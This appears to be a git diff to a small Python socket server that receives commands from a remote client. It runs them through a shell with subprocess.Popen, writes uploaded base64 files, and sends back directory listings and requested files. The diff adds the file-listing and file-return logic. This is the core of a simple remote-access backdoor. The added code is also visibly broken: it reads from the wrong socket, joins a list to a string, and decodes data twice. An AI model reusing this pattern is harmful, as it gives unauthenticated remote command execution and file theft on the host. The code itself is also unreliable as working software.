@@ -8,6 +8,21 @@ import subprocess
 HEADERSIZE = 10
 PORT = 64209
 
+def retrieveMessage(s):
+    newMessage = True
+    fullMessage = ""
+    while True:
+        msg = s.recv(16)
+        if newMessage:
+            print(f"new message length = {msg[:HEADERSIZE]}")
+            msgLength = int(msg[:HEADERSIZE])
+            newMessage = False
+        fullMessage += msg.decode("UTF-8")
+        if len(fullMessage)-HEADERSIZE == msgLength:
+            print("Full message received...")
+            print(fullMessage[HEADERSIZE:])
+            return fullMessage
+
 ### Execute ###
 def Execute(command):
     subprocess.Popen(command, shell=True)
@@ -45,22 +60,37 @@ def main():
         messageForClient = f'{len(messageForClient):<{HEADERSIZE}}' + messageForClient
         clientsocket.send(bytes(messageForClient, "UTF-8"))
         
-        # Receive message from client
-        msg = clientsocket.recv(1024)
-        msg = msg.decode("utf-8")
+        msg = retrieveMessage(s)
+        
+        # Send message to client)
         
         # Parse the command from the client
         command = msg.split()[0]
-        if command == "execute":
+        if "execute" in command:
             command = msg.split()[1:]
             Execute(command)
-        elif command == "upload":
+        elif "upload" in command:
             b64String = msg.split()[1]
             outputFile = msg.split()[2]
             Upload(b64String, outputFile)
-        elif command == "download":
-            fileName = msg.split()[1]
-            Download(fileName)
+        elif "download" in command:
+            # Get a list of files in the current directory
+            fileList = os.listdir()
+
+            print(fileList)
+            
+            # Send the list of files back to the client
+            messageForClient = f'{len(fileList):<{HEADERSIZE}}' + fileList
+            clientsocket.send(bytes(messageForClient, "UTF-8"))
+
+            # Receive the file name chosen by the client
+            fileName = retrieveMessage(s)
+            fileName = fileName.decode("utf-8")
+
+            # Download the file and send it back to the client
+            OutputText = Download(fileName)
+            messageForClient = f'{len(OutputText):<{HEADERSIZE}}' + OutputText
+            clientsocket.send(bytes(messageForClient, "UTF-8"))
 
 if __name__ == '__main__':
     main()
